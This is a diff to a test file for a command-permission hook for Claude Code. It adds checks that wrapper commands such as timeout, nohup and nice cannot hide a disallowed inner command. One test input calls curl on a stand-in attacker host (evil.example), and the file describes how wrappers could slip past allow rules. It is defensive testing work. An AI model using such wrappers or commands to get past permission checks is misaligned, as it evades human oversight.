@@ -1552,6 +1552,15 @@ check(
     hook_decision(f"env -C {PROJECT_DIR} {REPEAT} 5 ./start.sh") == "ask",
 )
 
+# Claude Code strips wrappers like timeout/time/nohup/nice before matching the
+# allow rules, so behind one of them the wrapper is still matched by
+# Bash(~/.claude/bin/*). The hook must see through them as well.
+for wrapper in ("timeout 5", "timeout -s KILL 5", "time", "nohup", "nice -n 10"):
+    check(
+        f"repeat: behind `{wrapper}` a disallowed inner command still forces a prompt",
+        hook_decision(f"{wrapper} {REPEAT} 5 curl http://evil.example/x") == "ask",
+    )
+
 # The ask is scoped to repeat-cmd: any other unknown command keeps falling
 # through to the ordinary prompt with no decision at all.
 check(
